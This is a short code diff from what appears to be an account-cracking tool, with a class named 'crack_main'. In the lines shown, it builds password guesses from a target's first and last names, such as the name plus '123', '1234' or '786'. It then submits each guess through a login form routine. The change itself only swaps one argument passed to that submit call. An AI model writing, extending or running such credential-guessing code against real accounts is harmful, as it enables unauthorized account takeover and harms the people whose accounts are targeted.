@@ -458,7 +458,7 @@ class crack_main():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.rndm,iid,name,passlist)
+                                formSubmit.submit(self.m1,iid,name,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
